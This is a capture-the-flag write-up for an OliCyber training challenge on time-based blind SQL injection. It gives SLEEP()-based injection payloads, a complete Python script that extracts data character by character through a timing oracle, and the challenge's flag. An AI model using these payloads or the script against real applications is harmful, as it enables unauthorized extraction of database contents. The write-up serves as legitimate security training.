# URL
https://training.olicyber.it/challenges#challenge-359

# Concept
Performing Time-Based Blind SQL Injection using `SLEEP()`

# Method of Solve
- Go to the Challenge Interface
- Navigate to http://web-17.challs.olicyber.it/time
- The application embeds input into:
  ```
    SELECT * FROM dummy WHERE sometext='<input>'
  ```
- No result or error is returned — only response timing reveals truth
- Test `SLEEP()` with a true condition:
  ```
    1' AND (SELECT SLEEP(1) FROM flags WHERE 1=1)='1
  ```
  Response time: **~1.2s** (sleep executed)
- Test with a false condition:
  ```
    1' AND (SELECT SLEEP(1) FROM flags WHERE 1=2)='1
  ```
  Response time: **~0.2s** (no sleep)
- The hint reveals the flag is in the `flags` table, column `flag`
- Determine flag length:
  ```
    1' AND (SELECT SLEEP(1) FROM flags WHERE LENGTH(flag)=21)='1
  ```
  Response time: **~1.2s** → length is 21
- Extract characters via binary search on ASCII values using `SLEEP()` as the oracle:
  ```
    1' AND (SELECT SLEEP(1) FROM flags WHERE ASCII(SUBSTR(flag,1,1))<=102)='1
  ```
- Iterate for each position → **flag{Dont_trus7_tim3}**

# Final Script
```python
import requests, re, time, sys

BASE_URL = "http://web-17.challs.olicyber.it"

s = requests.Session()
resp = s.get(f"{BASE_URL}/time")
csrf = re.search(r"csrf_token\s*=\s*'([^']+)'", resp.text).group(1)

headers = {"X-CSRFToken": csrf, "Content-Type": "application/json"}

def test(condition):
    payload = f"1' AND (SELECT SLEEP(1) FROM flags WHERE {condition})='1"
    data = {"query": payload}
    start = time.time()
    s.post(f"{BASE_URL}/api/time", headers=headers, json=data)
    return time.time() - start > 1

def extract_string(max_len=200):
    for l in range(1, max_len + 1):
        if test(f"LENGTH(flag)={l}"):
            length = l
            print(f"[+] Length: {l}")
            break
    result = ""
    for pos in range(1, length + 1):
        low, high = 32, 126
        while low < high:
            mid = (low + high) // 2
            if test(f"ASCII(SUBSTR(flag,{pos},1))<={mid}"):
                high = mid
            else:
                low = mid + 1
        result += chr(low)
        sys.stdout.write(f"\r[+] {result}")
        sys.stdout.flush()
    print()
    return result

flag = extract_string(100)
print(f"\n[+] Flag: {flag}")
```
- So the flag is **flag{Dont_trus7_tim3}**
